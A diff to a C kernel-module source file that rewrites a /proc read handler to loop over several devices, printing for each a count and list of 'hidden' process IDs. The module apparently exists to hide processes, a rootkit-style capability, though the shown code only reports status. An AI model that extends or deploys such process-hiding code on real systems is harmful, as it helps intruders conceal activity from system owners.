@@ -21,6 +21,7 @@
 
 #include "logging.h"
 #include "types.h"
+#include "device/device.h"
 #include "proc/details/file_ops.h"
 
 int proc_open_mem(struct inode* /*p_inode*/, struct file* p_file)
@@ -30,30 +31,31 @@ int proc_open_mem(struct inode* /*p_inode*/, struct file* p_file)
 
 int proc_read_mem(struct seq_file* p_file, void* p_data)
 {
-    module_dev_t* p_dev = (module_dev_t*)p_data;
     //const int size = p_file->size - 80;
     const int limit = p_file->size - 160;
     hash_node_t* p_cur = NULL;
     unsigned bkt;
 
-    if (mutex_lock_interruptible(&p_dev->lock)) {
-        KLOG_DEBUG(LOG_PREFIX "proc::proc_read_mem: failed to lock mutex");
-        return -ERESTARTSYS;
-    }
-
-    seq_printf(p_file,"Log level: %i\n", GET_LOGF_LEVEL());
-    seq_printf(p_file,"Count of hidden processes: %lu\n", p_dev->hash_tbl.size);
-    seq_printf(p_file,"Hidden pids:\n");
-
-    hash_for_each(p_dev->hash_tbl.tbl, bkt, p_cur, node) {
-        if (p_file->count > limit) {
-            seq_printf(p_file,"  -- too many pids to print...\n");
-            break;
+    for (int i = 0; i < device_nr_devs; ++i) {
+        module_dev_t* p_dev = devices_tbl + i;
+        if (mutex_lock_interruptible(&p_dev->lock)) {
+            KLOG_DEBUG(LOG_PREFIX "proc::proc_read_mem: failed to lock mutex");
+            return -ERESTARTSYS;
         }
-        seq_printf(p_file,"  -- %i;\n", p_cur->pid);
-    }
 
-    mutex_unlock(&p_dev->lock);
+        seq_printf(p_file,"Log level: %i\n", GET_LOGF_LEVEL());
+        seq_printf(p_file,"Count of hidden processes: %lu\n", p_dev->hash_tbl.size);
+        seq_printf(p_file,"Hidden pids:\n");
+
+        hash_for_each(p_dev->hash_tbl.tbl, bkt, p_cur, node) {
+            if (p_file->count > limit) {
+                seq_printf(p_file,"  -- too many pids to print...\n");
+                break;
+            }
+            seq_printf(p_file,"  -- %i;\n", p_cur->pid);
+        }
+        mutex_unlock(&p_dev->lock);
+    }
 
     return 0;
 }
